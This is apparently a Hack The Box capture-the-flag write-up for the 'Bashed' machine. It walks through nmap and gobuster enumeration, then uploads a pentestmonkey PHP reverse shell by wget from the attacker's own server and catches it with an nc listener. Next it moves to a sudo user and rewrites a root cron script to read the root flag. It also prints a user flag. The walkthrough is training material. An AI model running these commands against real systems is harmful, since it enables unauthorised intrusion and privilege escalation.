# BASHED

## ENUMERATION

Running the nmap scan we find only one port open

```
nmap 10.10.10.68 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 04:59 EDT
Nmap scan report for 10.10.10.68
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Finding the http port open I ran gobuster to find directories 

```
===============================================================
2021/08/03 05:04:51 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]                                
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/server-status        (Status: 403) [Size: 299]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
```

Opening the /dev directory that we found through gobuster we find a interactive web shell 

## SHELL

Running the ```ls -la``` command in the ```/var/www/html``` directory we find that the ```uploads``` directory is the only one in which our user i.e. ```www-data``` has write permission. So that's where we can upload php reverse shell.

Downloading php reverse shell from <http://pentestmonkey.net/tools/web-shells/php-reverse-shell> on my machine and changing the ip to our system tunnel ip and the port to 4444

Running the command ```python -m SimpleHTTPServer``` to start a http server on our machine in the same directory as the php reverse shell we need to upload

![](https://github.com/Leo-2807/Writeups/blob/main/images/hackthebox/bshed2.png)

Now we run the command ```wget http://10.10.14.36:8000/php-reverse-shell.php``` to download the reverse shell on the machine

![](https://github.com/Leo-2807/Writeups/blob/main/images/hackthebox/bashed1.png)

Starting nc listerner ```nv -lvnp 4444``` on our system and then opening the url <http.//10.10.10.68/uploads/php-reverse-shell.php>

![](https://github.com/Leo-2807/Writeups/blob/main/images/hackthebox/bashed3.png)	

We get a shell which we stabilize with the command ```python -c 'import pty; pty.spawn("/bin/bash")'```

## WWW-DATA --> USER

Using the command ```sudo -l``` 

This means that we have permissions to become user scriptmanager without password

```
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ whoami
whoami
scriptmanager
scriptmanager@bashed:/$ cd /home
cd /home
scriptmanager@bashed:/home$ ls 
ls 
arrexel  scriptmanager
scriptmanager@bashed:/home$ cd arrexel
cd arrexel
scriptmanager@bashed:/home/arrexel$ ls
ls
user.txt
scriptmanager@bashed:/home/arrexel$ cat user.txt
cat user.txt
2c281f318555dbc1b856957c7147bfc1
```
And we have our user flag

## USER --> ROOT

Using command ```ls -la``` in the / diectory we find only one directory writabble to out user ```scripts```
```
scriptmanager@bashed:/$ ls -la
ls -la
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           4240 Aug  3 01:57 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 115 root          root              0 Aug  3 01:57 proc
drwx------   3 root          root           4096 Dec  4  2017 root
drwxr-xr-x  18 root          root            500 Aug  3 01:58 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Aug  3 02:57 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Aug  3 02:16 sys
drwxrwxrwt  10 root          root           4096 Aug  3 03:03 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
In the scripts directory we find two files 
```
scriptmanager@bashed:/$ cd /scripts
cd /scripts
scriptmanager@bashed:/scripts$ ls
ls
test.py  test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!
```

using ```ls -la ``` command we see that the time of last execution of test.py is the current time which lead me to try it again after a few minutes and the time was again same as the current time 
This means that the script is being executed by crontab running in the background 

We use this to read root.txt
```
scriptmanager@bashed:/scripts$ echo 'import os' > test.py
echo 'import os' > test.py
scriptmanager@bashed:/scripts$ echo 'os.system("cat /root/root.txt > /tmp/readme.txt")' >> test.py
<ts$ echo 'os.system("cat /root/root.txt > /tmp/readme.txt")' >> test.py     
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
import os
os.system("cat /root/root.txt > /tmp/readme.txt")
scriptmanager@bashed:/scripts$ cd /tmp
cd /tmp
scriptmanager@bashed:/tmp$ ls
ls
VMwareDnD
readme.txt
systemd-private-fb9d9649303741a0b3e5ee96e5c01d4d-systemd-timesyncd.service-8VKUb9
vmware-root
scriptmanager@bashed:/tmp$ cat readme.txt
```
And we have out root flag
